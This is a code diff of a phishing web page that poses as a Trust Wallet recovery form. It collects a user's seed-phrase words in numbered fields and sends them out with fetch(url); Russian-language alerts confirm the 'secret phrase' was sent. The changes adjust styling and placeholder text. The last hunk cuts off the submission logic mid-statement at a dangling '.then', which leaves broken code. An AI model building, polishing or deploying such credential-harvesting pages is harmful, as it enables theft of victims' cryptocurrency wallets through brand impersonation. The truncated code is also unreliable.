@@ -63,6 +63,7 @@
             font-weight: bold;
             margin-right: 8px;
             flex-shrink: 0;
+            width: 30px; /* Фиксированная ширина для метки */
         }
         input {
             padding: 10px;
@@ -71,7 +72,7 @@
             border-radius: 6px;
             background-color: #2C2C2C;
             color: #FFFFFF;
-            width: 100%;
+            width: calc(100% - 40px); /* Уменьшаем ширину, чтобы учесть метку */
             box-sizing: border-box;
             text-align: left;
         }
@@ -127,7 +128,7 @@
             <div class="seed-input">
                 <div class="seed-item">
                     <label for="word1">1.</label>
-                    <input type="text" id="word1" name="word1" placeholder="Seed's" inputmode="latin" autocapitalize="none" required>
+                    <input type="text" id="word1" name="word1" placeholder="Please seed" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word2">2.</label>
@@ -196,24 +197,4 @@
 
                 fetch(url)
                     .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            alert('Секретная фраза успешно отправлена!');
-                        } else {
-                            alert('Ошибка отправки.');
-                        }
-                    })
-                    .catch(error => {
-                        alert('Ошибка отправки.');
-                    });
-            } else {
-                alert('Пожалуйста, заполните все поля.');
-            }
-        });
-    </script>
-
-    <footer>
-        © 2025 Trust Wallet. Все права защищены.
-    </footer>
-</body>
-</html>
+                    .then
